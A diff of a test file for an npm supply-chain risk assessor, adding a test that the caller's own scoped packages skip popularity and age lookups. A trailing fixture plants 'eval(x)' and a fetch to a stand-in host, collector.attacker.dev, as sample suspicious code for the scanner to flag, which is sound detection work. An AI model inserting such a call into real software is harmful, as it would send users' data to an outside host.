@@ -139,6 +139,21 @@ test('a host where packages keep their code and docs, named anew, calls for no l
     'github.com\'s pages and lit.dev allowed; api.github.com, a host under one, named, and every repository github.com serves what it holds from, by any path but a page')
 })
 
+test('a new dependency on the caller\'s own package is told no tier nor age, nor is npm asked of it', async t => {
+  const before = version('app', '1.0.0', { 'package.json': '{}', 'index.js': '' }, { dependencies: {} }, ago(30))
+  const after = version('app', '1.0.1', { 'package.json': '{}', 'index.js': 'require("@mine/fresh")\nrequire("stranger")\n' },
+    { dependencies: { '@mine/fresh': '^1.0.0', stranger: '^1.0.0' } }, ago(20))
+  const asked = npm(t, [{ name: 'app', versions: [before, after] }, { name: 'stranger', versions: [version('stranger', '1.0.0', { 'package.json': '{}' }, {}, ago(21))] }])
+  const added = async options => Object.fromEntries((await assessNpm('app', '1.0.1', { oldVersion: '1.0.0', now: NOW, ...options })).dependencies.added.map(row => [row.name, row]))
+  asked.length = 0
+  assert.equal((await added({})).stranger.level, 'is-unpopular', 'npm counts none of its downloads')
+  assert.ok(asked.some(url => url.includes('mine')), 'and is asked of @mine/fresh, as of any other')
+  asked.length = 0
+  const own = await added({ owned: name => Promise.resolve(name.startsWith('@mine/')) })
+  assert.deepEqual([own['@mine/fresh'].level, own['@mine/fresh'].created, own.stranger.level], [undefined, undefined, 'is-unpopular'], 'the caller\'s own told nothing of, another as before')
+  assert.ok(!asked.some(url => url.includes('mine')), 'nor its downloads nor its first publish asked')
+})
+
 test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
   const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
   const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
